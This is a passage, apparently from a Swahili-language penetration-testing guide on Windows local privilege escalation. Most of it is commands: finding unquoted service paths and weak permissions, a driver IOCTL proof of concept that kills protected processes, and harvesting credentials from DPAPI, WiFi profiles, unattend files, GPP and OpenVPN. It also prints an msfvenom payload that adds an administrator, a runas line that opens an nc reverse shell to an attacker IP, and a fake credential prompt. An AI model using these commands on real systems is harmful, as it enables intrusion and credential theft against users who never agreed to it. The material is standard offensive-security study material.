Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kuendesha:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha unquoted service paths zote, ukiondoa zile zinazomilikiwa na built-in Windows services:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na kuchukua faida** ya udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda kwa mkono service binary kwa metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Urejesho

Windows inaruhusu watumiaji kutaja hatua zitakazochukuliwa ikiwa service itashindwa. Kipengele hiki kinaweza kusanidiwa kuashiria binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation inaweza kuwa inawezekana. Maelezo zaidi yanaweza kupatikana katika [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Programu

### Programu Zilizowekwa

Angalia **idhini za binaries** (labda unaweza kuandika moja na kusababisha privilege escalation) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia kama unaweza kubadilisha config file ili kusoma special file, au kubadilisha binary itakayotekelezwa na Administrator account (schedtasks).

Njia ya kupata ruhusa dhaifu za folda/faili katika mfumo ni kwa kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ ina-autoload DLL yoyote ya plugin chini ya folda zake ndogo za `plugins`. Ikiwa kuna ufungaji wa portable/copy unaoweza kuandikwa, kuingiza plugin yenye madhara hutoa utekelezaji wa msimbo kiotomatiki ndani ya `notepad++.exe` kila mara inapoanzishwa (ikiwa ni pamoja na kutoka `DllMain` na plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Endesha wakati wa kuanza

**Angalia kama unaweza kuandika tena registry au binary ambayo itatekelezwa na mtumiaji mwingine.**\
**Soma** ukurasa **unaofuata** ili ujifunze zaidi kuhusu maeneo ya kuvutia ya **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Tafuta drivers zinazowezekana za **third party weird/vulnerable**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Ikiwa driver inaonyesha primitive ya arbitrary kernel read/write (kawaida katika IOCTL handlers zisizotengenezwa vizuri), unaweza kupandisha hadhi kwa kuiba token ya SYSTEM moja kwa moja kutoka kwenye kumbukumbu ya kernel. Angalia mbinu hatua‑kwa‑hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Kwa bugs za race-condition ambapo antaki inayokabiliwa inafungua Object Manager path inayodhibitiwa na mshambuliaji, kupunguza kwa makusudi kasi ya lookup (kutumia max-length components au deep directory chains) kunaweza kupanua dirisha kutoka microseconds hadi miongo kadhaa ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Primitive za uharibifu wa kumbukumbu za Registry hive

Utaratibu wa kisasa wa hive unakuwezesha kupanga deterministic layouts, kutumia wanachama wa writable HKLM/HKU, na kubadilisha uharibifu wa metadata kuwa kernel paged-pool overflows bila driver maalum. Jifunze mnyororo mzima hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Baadhi ya driver za tatu‑pande zilizotiwa saini huunda device object zao na SDDL kali kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN kwenye DeviceCharacteristics. Bila bendera hii, secure DACL haitotekelezwa pale device inafunguliwa kupitia path yenye component ziada, ikiruhusu mtumiaji anayefanya kazi bila vibali kupata handle kwa kutumia namespace path kama:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Mara mtumiaji anapoweza kufungua device, IOCTLs zenye vibali zilizoonyeshwa na driver zinaweza kutumiwa vibaya kwa LPE na kuingilia. Uwezo ulioonekana kwa mfano katika mazingira halisi:
- Kurudisha handles za ufikiaji kamili kwa processes yoyote (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Kumaliza processes yoyote, ikiwa ni pamoja na Protected Process/Light (PP/PPL), ikiruhusu kuua AV/EDR kutoka user land kupitia kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Kupunguza hatari kwa watengenezaji
- Daima weka FILE_DEVICE_SECURE_OPEN wakati wa kuunda device objects zinazokusudiwa kuzuiwa na DACL.
- Thibitisha muktadha wa mtumaji kwa privileged operations. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu process termination au kurudisha handles.
- Zuia IOCTLs (access masks, METHOD_*, input validation) na fikiria modeli za brokered badala ya kuipa direct kernel privileges.

Mawazo ya utambuzi kwa walinda
- Fuatilia user-mode opens za majina ya device yenye shaka (e.g., \\ .\\amsdk*) na mfuatano maalum wa IOCTL unaoashiria matumizi mabaya.
- Tekeleza orodha ya kuzuia madereva hatarishi ya Microsoft (HVCI/WDAC/Smart App Control) na dhawiti maintain allow/deny lists zako mwenyewe.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Angalia ruhusa za folda zote ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Mtandao

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Angalia kompyuta nyingine zilizojulikana zilizowekwa hardcoded kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Violesura vya Mtandao na DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari Zilizofunguliwa

Angalia kwa ajili ya **huduma zilizozuiliwa** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Uelekezaji
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Angalia ukurasa huu kwa amri zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha kanuni, tengeneza kanuni, zima, zima...)**

Zaidi[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Fayela la binary `bash.exe` pia linaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ikiwa unapata root user unaweza kusikiliza kwenye bandari yoyote (wakati wa kwanza unapotumia `nc.exe` kusikiliza kwenye bandari itakuuliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanza bash kama root kwa urahisi, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` katika folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Cheti za Windows

### Cheti za Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault inahifadhi nyaraka za mtumiaji kwa seva, tovuti na programu nyingine ambazo **Windows** inaweza **kuingia kwa watumiaji moja kwa moja**. Mwanzoni, hili linaweza kuonekana kama kwamba watumiaji wanaweza kuhifadhi nyaraka zao za Facebook, Twitter, Gmail n.k., ili waingie moja kwa moja kupitia vivinjari. Lakini si hivyo.

Windows Vault inahifadhi nyaraka ambazo **Windows** inaweza kutumia kuingia kwa watumiaji moja kwa moja, ambayo inamaanisha kwamba programu yoyote **Windows application inayohitaji nyaraka ili kufikia rasilimali** (seva au tovuti) **inaweza kutumia Credential Manager hii** na Windows Vault na kutumia nyaraka zilizotolewa badala ya watumiaji kuingiza jina la mtumiaji na nenosiri kila wakati.

Isipokuwa programu hizo zinashirikiana na Credential Manager, sidhani itawezekana kwao kutumia nyaraka za rasilimali fulani. Kwa hivyo, ikiwa programu yako inataka kutumia vault, inapaswa kwa njia fulani **kuwasiliana na credential manager na kuomba nyaraka za rasilimali hiyo** kutoka kwa default storage vault.

Tumia `cmdkey` kuorodhesha nyaraka zilizohifadhiwa kwenye mashine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` na chaguo la `/savecred` ili kutumia sifa zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` na seti ya credential iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kutoka [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** inatoa njia ya encryption simetriki ya data, inayotumika hasa ndani ya mfumo wa uendeshaji Windows kwa encryption simetriki ya funguo za kibinafsi asimetriki. Encryption hii inatumia siri ya mtumiaji au ya mfumo ili kuchangia kwa kiasi kikubwa entropy.

**DPAPI inaruhusu encryption ya funguo kupitia funguo simetriki inayotokana na siri za kuingia za mtumiaji**. Katika matukio yanayohusisha encryption ya mfumo, inatumia siri za uthibitisho za domain ya mfumo.

Funguo za RSA za mtumiaji zilizofungwa kwa kutumia DPAPI zinahifadhiwa katika saraka %APPDATA%\Microsoft\Protect\{SID}, ambapo {SID} inawakilisha [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **The DPAPI key, iliyoko pamoja na master key inayolinda funguo za kibinafsi za mtumiaji katika faili hiyo hiyo**, kwa kawaida inaundwa na 64 bytes za data za nasibu. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umewekewa vikwazo, ukizuia kuorodhesha yaliyomo kwa kutumia amri ya `dir` kwenye CMD, ingawa inaweza kuorodheshwa kupitia PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` na hoja zinazofaa (`/pvk` au `/rpc`) kudekripti yake.

Faili za **credentials files protected by the master password** kwa kawaida ziko katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Vyeti vya PowerShell

**PowerShell credentials** mara nyingi hutumika kwa ajili ya **scripting** na kazi za automation kama njia ya kuhifadhi credentials zilizofichwa kwa urahisi. Credentials hizi zinatulindwa kwa kutumia **DPAPI**, ambayo kwa kawaida ina maana zinaweza tu ku-decrypt na mtumiaji yuleyule kwenye kompyuta ile ile zilipotengenezwa.

Ili **decrypt** PS credentials kutoka kwenye faili linaloiweka unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Miunganisho ya RDP iliyohifadhiwa

Unaweza kuzipata kwenye `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
na katika `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Amri zilizotumika hivi karibuni
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Meneja wa Uthibitisho wa Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Tumia **Mimikatz** `dpapi::rdg` module pamoja na `/masterkey` inayofaa ili **decrypt any .rdg files**\
Unaweza **extract many DPAPI masterkeys** kutoka kwenye memory kwa kutumia Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Watu mara nyingi hutumia app ya StickyNotes kwenye workstations za Windows kuhifadhi passwords na taarifa nyingine, bila kutambua kuwa ni faili ya database. Faili hii iko katika `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` na daima inafaa kutafutwa na kuchunguzwa.

### AppCmd.exe

**Kumbuka kwamba ili recover passwords kutoka AppCmd.exe unahitaji kuwa Administrator na kuendesha kwa High Integrity level.**\
**AppCmd.exe** iko katika `%systemroot%\system32\inetsrv\` directory.\
Kama faili hii ipo basi kuna uwezekano kwamba baadhi ya **credentials** zimetayarishwa na zinaweza ku-**recovered**.

Msimbo huu ulitolewa kutoka [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Angalia kama `C:\Windows\CCM\SCClient.exe` ipo .\
Wasakinishaji **huendeshwa kwa SYSTEM privileges**, wengi wao wanaweza kuathiriwa na **DLL Sideloading (Taarifa kutoka** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Faili na Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Vifunguo vya Putty SSH
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys katika rejista

SSH private keys zinaweza kuhifadhiwa ndani ya funguo la rejista `HKCU\Software\OpenSSH\Agent\Keys`, hivyo unapaswa kuangalia kama kuna kitu chochote cha kuvutia hapo:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Iwapo utapata chochote ndani ya njia hiyo, kuna uwezekano ni SSH key iliyohifadhiwa. Imehifadhiwa ikiwa imefichwa (encrypted) lakini inaweza kufunguliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu tekniki hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ikiwa huduma ya `ssh-agent` haifanyi kazi na ungependa ianze moja kwa moja wakati wa kuanzisha mfumo, endesha:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya ssh keys, kuziweka kwa `ssh-add` na kuingia kwa ssh kwenye mashine. Registry HKCU\Software\OpenSSH\Agent\Keys haipo na procmon haikuonyesha matumizi ya `dpapi.dll` wakati wa uthibitishaji wa ufunguo wa asimetri.

### Mafaili yasiyoshughulikiwa
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa yaliyomo:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Chelezo za SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cheti za Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Tafuta faili inayoitwa **SiteList.xml**

### Nenosiri la GPP lililohifadhiwa

Hapo awali kulikuwa na kipengele kilichoruhusu kuanzishwa kwa akaunti za local administrator zilizobinafsishwa kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na doa kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizo hifadhiwa kama faili za XML katika SYSVOL, zinaweza kufikiwa na mtumiaji yeyote wa domain. Pili, nywila ndani ya GPP hizi, zilizofichwa kwa AES256 kwa kutumia default key iliyotangazwa hadharani, zinaweza kufunguliwa (decrypted) na mtumiaji yeyote aliyeidhinishwa. Hili liliweka hatari kubwa, kwani liliwezesha watumiaji kupata vibali vilivyoinuliwa.

Ili kupunguza hatari hii, function ilitengenezwa kuchunguza faili za GPP zilizohifadhiwa kwa ndani zinazohusisha shamba la "cpassword" ambalo si tupu. Iwapo kifaili kama hicho kinapatikana, function hiyo inafungua nenosiri na kurudisha PowerShell object iliyobinafsishwa. Object hii inajumuisha maelezo kuhusu GPP na eneo la faili, ikisaidia kutambua na kurekebisha doa hili la usalama.

Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya Windows Vista)_ kwa faili hizi:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Ili ku-decrypt cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Kutumia crackmapexec kupata manenosiri:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Mfano wa web.config yenye taarifa za kuingia:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN sifa
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Omba credentials

Unaweza kila wakati **kumuuliza mtumiaji aingize credentials zake au hata credentials za mtumiaji mwingine** ikiwa unadhani anaweza kuyajua (tambuhi kwamba **kumuuliza** mteja moja kwa moja kwa **credentials** ni **hatari** sana):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Mafaili yanayoweza kuwa na credentials**

Mafaili yaliyojulikana ambayo muda fulani uliopita yaliwamo **passwords** kwa **clear-text** au **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
